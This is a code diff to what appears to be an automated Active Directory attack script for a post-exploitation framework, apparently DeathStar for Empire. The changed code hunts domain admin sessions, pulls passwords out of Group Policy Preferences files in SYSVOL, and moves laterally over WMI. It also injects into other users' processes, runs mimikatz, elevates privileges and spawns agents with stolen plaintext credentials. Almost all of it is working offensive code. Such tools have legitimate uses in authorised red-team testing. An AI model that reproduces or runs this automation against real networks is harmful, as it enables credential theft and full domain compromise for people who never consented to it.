@@ -252,7 +252,7 @@ def user_hunter(agent_name, group_name='"Domain Admins"', threads=20, no_ping=Fa
 
         if session: admin_sessions.append(session)
 
-    print_good('Found {} active Admin sessions: {}'.format(len(admin_sessions), [session['hostname'] for session in admin_sessions]), agent_name)
+    print_good('Found {} active admin sessions: {}'.format(len(admin_sessions), [session['hostname'] for session in admin_sessions]), agent_name)
 
     return admin_sessions
 
@@ -308,7 +308,7 @@ def tokens(agent_name):
 def gpp(agent_name):
     results = execute_module_with_results('powershell/privesc/gpp', agent_name)
     results = results.split('\r\n\r\n')
-    
+
     gpps = []
     for result in results:
         entries = result.split('\r\n')
@@ -338,16 +338,18 @@ def gpp(agent_name):
                 for remainder in entries[file_index+1:]:
                     file += remainder.strip()
 
-        if file and (usernames and passwords):
-            gpp['file'] = file
-            gpp['guid'] = file.split('\\')[6][1:-1]
-            if not len(gpp['guid']) == 36:
+        if file and usernames and passwords:
+            guid = file.split('\\')[6][1:-1]
+            if not len(guid) == 36:
                 raise
 
-            gpp['creds'] = dict(zip(usernames, passwords))
-            gpps.append(gpp)
+            if not list(filter(lambda v: v['guid'] == guid, gpps)):
+                gpp['file'] = file
+                gpp['guid'] = guid
+                gpp['creds'] = dict(zip(usernames, passwords))
+                gpps.append(gpp)
 
-    print_good('Found {} credentials using GPP SYSVOL privesc'.format(len(gpps)), agent_name)
+    print_good('Found {} GPO(s) containing credentials using GPP SYSVOL privesc'.format(len(gpps)), agent_name)
 
     return gpps
 
@@ -467,6 +469,9 @@ def recon(agent_name):
         for dc in get_domain_controller(agent_name):
             domain_controllers.append(dc)
 
+        if not domain_admins and not domain_controllers:
+            print_bad('Could not find Domain Admins and Domain Controllers. This usually means something is wrong with the Agent.')
+
         for session in user_hunter(agent_name, no_ping=True):
             if session['hostname'] not in priority_targets:
                 priority_targets.append(session['hostname'])
@@ -484,36 +489,33 @@ def spread(agent_name):
             spread_usernames.append(agents[agent_name]['username'])
 
             print_info('Starting lateral movement', agent_name)
-            for box in set(priority_targets) ^ set(domain_controllers):
-                if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
-                    invoke_wmi(agent_name, box, 'DeathStar')
+            if priority_targets:
+                for box in set(priority_targets) ^ set(domain_controllers):
+                    if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
+                        invoke_wmi(agent_name, box)
 
             for box in find_localadmin_access(agent_name, no_ping=True):
                 # Do we have an agent on the box? if not pwn it
                 if not agent_on_host(hostname=box):
-                    invoke_wmi(agent_name, box, 'DeathStar')
+                    invoke_wmi(agent_name, box)
 
 def privesc(agent_name):
     if running_under_domain_account(agent_name):
+        tried_domain_privesc = True
 
         print_info('Starting domain privesc', agent_name)
-        results = gpp(agent_name)
-
-        for result in results:
+        for result in gpp(agent_name):
             computers = get_gpo_computer(agent_name, result['guid'])
             for username, password in result['creds'].items():
                 for box in set(priority_targets) & set(computers):
                     if not agent_on_host(hostname=box):
                         # These are local accounts so we append '.\' to the username to specify it
-                        invoke_wmi(agent_name, box, 'DeathStar', '.\\' + username, password)
+                        invoke_wmi(agent_name, box, username='.\\' + username, password=password)
 
             for username, password in result['creds'].items():
                 for box in computers:
                     if not agent_on_host(hostname=box):
-                        # These are local accounts so we append '.\' to the username to specify it
-                        invoke_wmi(agent_name, box, 'DeathStar', '.\\' + username, password)
-
-        tried_domain_privesc = True
+                        invoke_wmi(agent_name, box, username='.\\' + username, password=password)
 
     del privesc_threads[agent_name]
 
@@ -522,7 +524,7 @@ def pwn_the_shit_out_of_everything(agent_name):
     This is the function that takes care of the logic for each agent thread
     '''
 
-    if (not domain_controllers or not domain_admins or not priority_targets) and not recon_threads:
+    if (not domain_controllers or not domain_admins) and not recon_threads:
         recon_threads[agent_name] = 'u w0t m8'
         recon(agent_name)
         #recon_threads[agent_name] = KThread(target=recon, args=(agent_name,))
@@ -550,6 +552,7 @@ def pwn_the_shit_out_of_everything(agent_name):
             if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
                 print_info('Found process {} running under {}'.format(process['pid'], process['username']), agent_name)
                 psinject(agent_name, process['pid'])
+                psinject_usernames.append(process['username'])
 
         if agents[agent_name]['os'].lower().find('windows 7') != -1:
             mimikatz_thread = KThread(target=mimikatz, args=(agent_name,))
@@ -560,13 +563,17 @@ def pwn_the_shit_out_of_everything(agent_name):
         if not agent_on_host(hostname=agents[agent_name]['hostname'], high_integrity=True):
             elevate(agent_name)
 
-    # Spawn only two additional agents per host
-    for loop in range(2): 
-        for cred in get_stored_credentials()['creds']:
-            if cred['credtype'] == 'plaintext':
-                account = '{}\\{}'.format(cred['domain'].split('.')[0].upper(), cred['username'])
-                if account not in spread_usernames:
-                    spawnas(agent_name, cred_id=cred['ID'])
+    # We want to limit the amount of agents we spawn
+    spawned_agents = 0
+    for cred in get_stored_credentials()['creds']:
+        if cred['credtype'] == 'plaintext':
+            account = '{}\\{}'.format(cred['domain'].split('.')[0].upper(), cred['username'])
+            if (account not in spread_usernames) and (account not in psinject_usernames):
+                spawnas(agent_name, cred_id=cred['ID'])
+                spawned_agents += 1
+
+        if spawned_agents == 2:
+            break
 
 ############################################################################################################################################
 
@@ -618,7 +625,7 @@ def print_debug(msg, agent_name=None):
 def print_win_banner():
     print('\n')
     print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
-    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
+    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
     print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
 
 def signal_handler(signal, frame):
@@ -766,6 +773,7 @@ priority_targets   = [] # List of boxes with admin sessions
 domain_controllers = []
 domain_admins      = []
 spread_usernames   = [] # List of accounts we already used to laterally spread
+psinject_usernames = [] # List of accounts we psinjected into
 
 login(args.username, args.password)
 
